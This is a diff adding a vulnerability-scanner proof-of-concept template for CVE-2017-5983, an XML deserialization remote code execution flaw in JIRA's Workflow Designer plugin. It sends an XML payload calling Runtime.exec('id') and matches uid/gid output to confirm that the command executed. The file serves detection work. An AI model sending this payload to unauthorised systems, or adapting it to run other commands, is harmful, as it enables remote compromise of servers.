@@ -1,0 +1,64 @@
+[info]
+author = "ave"
+description = "检测 Atlassian JIRA Workflow Designer Plugin XML 反序列化远程代码执行漏洞 (CVE-2017-5983)"
+id = "POC-AVE-2017-0120"
+name = "CVE-2017-5983 PoC"
+severity = "critical"
+tags = ["ave-2017-0120"]
+vuln_id = [
+    "CVE-2017-5983",
+    "AVE-2017-0120",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/rest/workflowdesigner/1.0/workflow/render"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="UTF-8"?>
+<workflow>
+  <name>test</name>
+  <description>test</description>
+  <steps>
+    <step>
+      <id>1</id>
+      <name>Start</name>
+      <actions>
+        <action>
+          <name>test</name>
+          <type>com.opensymphony.workflow.util.OSWorkflowUtil</type>
+          <args>
+            <arg>
+              <string>java.lang.Runtime.getRuntime().exec("id")</string>
+            </arg>
+          </args>
+        </action>
+      </actions>
+    </step>
+  </steps>
+</workflow>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+    "groups=",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
